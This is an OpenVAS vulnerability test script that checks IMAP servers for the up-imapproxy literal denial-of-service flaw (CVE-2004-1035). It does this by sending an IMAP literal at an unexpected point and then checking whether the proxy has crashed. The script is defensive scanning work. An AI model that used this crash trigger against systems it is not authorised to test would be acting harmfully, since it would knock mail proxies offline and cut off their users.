# OpenVAS Vulnerability Test
# $Id: imapproxy_literal_dos.nasl 13409 2019-02-01 13:13:33Z cfischer $
# Description: up-imapproxy Literal DoS Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>.
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15853");
  script_version("$Revision: 13409 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-01 14:13:33 +0100 (Fri, 01 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:P");
  script_cve_id("CVE-2004-1035");
  script_bugtraq_id(11630);
  script_name("up-imapproxy Literal DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2004 George A. Theall");
  script_family("Denial of Service");
  script_dependencies("imap4_banner.nasl");
  script_require_ports("Services/imap", 143);
  script_mandatory_keys("imap/banner/available");

  script_tag(name:"solution", value:"Upgrade to up-imapproxy 1.2.3rc2 or later.");

  script_tag(name:"summary", value:"The remote host is running at least one instance of up-imapproxy that does
  not properly handle IMAP literals.");

  script_tag(name:"impact", value:"This flaw allows a remote attacker to crash the proxy, killing existing
  connections as well as preventing new ones, by using literals at unexpected times.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("imap_func.inc");
include("misc_func.inc");

port = get_imap_port(default:143);

# nb: skip it if traffic is encrypted since uw-imapproxy only supports TLS when acting as a client.
encaps = get_port_transport(port);
if(encaps > ENCAPS_IP)
  exit(0);

banner = get_imap_banner(port:port);
if(!banner)
  exit(0);

tag = 0;

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

s = recv_line(socket:soc, length:1024);
s = chomp(s);
if(!s) {
  close(soc);
  exit(0);
}

vtstrings = get_vt_strings();

++tag;
c = string("a", string(tag), " ", vtstrings["lowercase"], " is testing {1}");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
  resp = '';
}
if (resp && resp =~ "BAD") {
  c = "up-imapproxy";
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    # nb: the pattern changes since an unproxied service will echo a line
    #     like "up-imapproxy BAD Missing command".
    m = eregmatch(pattern:"^[^ ]+ (OK|BAD|NO)", string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
    resp = '';
  }
  # If we didn't get a response, make sure the service is truly down.
  if (!resp) {
    close(soc);
    soc = open_sock_tcp(port);
    if (!soc) {
      security_message(port:port);
      exit(0);
    }
  }
}

# Logout.
++tag;
c = string("a", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
  resp = "";
}

close(soc);
exit(99);